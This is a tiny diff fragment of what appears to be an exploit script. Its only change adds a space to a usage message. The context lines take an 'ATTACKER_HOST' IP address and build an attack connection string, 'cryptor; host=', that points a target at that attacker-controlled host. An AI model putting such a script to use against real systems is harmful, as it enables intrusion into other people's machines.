@@ -14,7 +14,7 @@ try:
     ATTACKER_HOST = sys.argv[1]
     ATTACK_DBSTR = "cryptor; host=" + ATTACKER_HOST
 except IndexError:
-    print("Usage: " + sys.argv[0] + "<YOUR IP ADDR>")
+    print("Usage: " + sys.argv[0] + " <YOUR IP ADDR>")
     sys.exit(1)
 
 
